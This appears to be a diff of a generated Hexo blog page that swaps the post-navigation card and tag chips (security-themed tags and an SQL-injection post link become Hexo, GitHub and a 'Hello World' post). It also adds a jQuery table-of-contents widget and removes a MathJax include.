+                            <a href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/" class="post-category">
+                                    软件安装与配置
                                 </a>
                             
                             
@@ -1004,16 +1034,16 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Web/">
-                        <span class="chip bg-color">Web</span>
+                    <a href="/tags/Hexo/">
+                        <span class="chip bg-color">Hexo</span>
                     </a>
                     
-                    <a href="/tags/%E6%B8%97%E9%80%8F/">
-                        <span class="chip bg-color">渗透</span>
+                    <a href="/tags/Github/">
+                        <span class="chip bg-color">Github</span>
                     </a>
                     
-                    <a href="/tags/ssrf/">
-                        <span class="chip bg-color">ssrf</span>
+                    <a href="/tags/%E5%8D%9A%E5%AE%A2/">
+                        <span class="chip bg-color">博客</span>
                     </a>
                     
                 </div>
@@ -1024,51 +1054,37 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
             </div>
             <div class="card">
-                <a href="/2022/05/14/mysql%E6%B3%A8%E5%85%A5%E5%A4%A9%E4%B9%A6/">
+                <a href="/2022/05/01/hello-world/">
                     <div class="card-image">
                         
-                        <img src="/medias/banner/4.jpg" class="responsive-img" alt="mysql注入天书">
                         
-                        <span class="card-title">mysql注入天书</span>
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
+                        
+                        <span class="card-title">Hello World</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一本书搞定sql注入
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-01
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
-                                    网络安全
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            hongfei
                             
                         </span>
                     </div>
                 </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Sql/">
-                        <span class="chip bg-color">Sql</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%B8%97%E9%80%8F/">
-                        <span class="chip bg-color">渗透</span>
-                    </a>
-                    
-                </div>
+
                 
             </div>
         </div>
@@ -1098,17 +1114,91 @@
 <script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
 
 
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
     
 
 </main>
 
-
-<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-<script>
-    MathJax.Hub.Config({
-        tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
-    });
-</script>
 
 
 
